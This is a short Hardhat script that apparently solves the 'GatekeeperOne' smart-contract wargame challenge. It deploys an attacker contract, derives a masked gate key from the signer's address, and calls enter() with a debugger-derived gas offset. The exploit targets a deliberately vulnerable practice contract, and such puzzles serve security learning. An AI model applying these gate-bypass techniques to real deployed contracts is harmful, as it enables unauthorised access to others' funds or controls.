const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0xa6Ab15ABcf98347Eb859406f29C89F8A2423ab63";
const CONTRACT_NAME = "GatekeeperOne";
const ATTACKER_NAME = "GatekeeperOneAttacker";

async function main() {
  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerContractFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerContractFactory.deploy(contract.address);
  await attackerContract.deployed();
  console.log("Attacker address", attackerContract.address);

  const mask = "0xffffffff0000ffff";
  const shortAddress = "0x" + attacker.address.slice(attacker.address.length - 16, attacker.address.length);
  const gateKey = BigNumber.from(shortAddress).and(mask);

  const gasOffset = 254; // Magic number taken from the debugger
  const tx = await attackerContract.enter(gasOffset, BigNumber.from(gateKey), { gasLimit: 30000000 });
  await tx.wait();
  console.log("Enter Successfully")
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});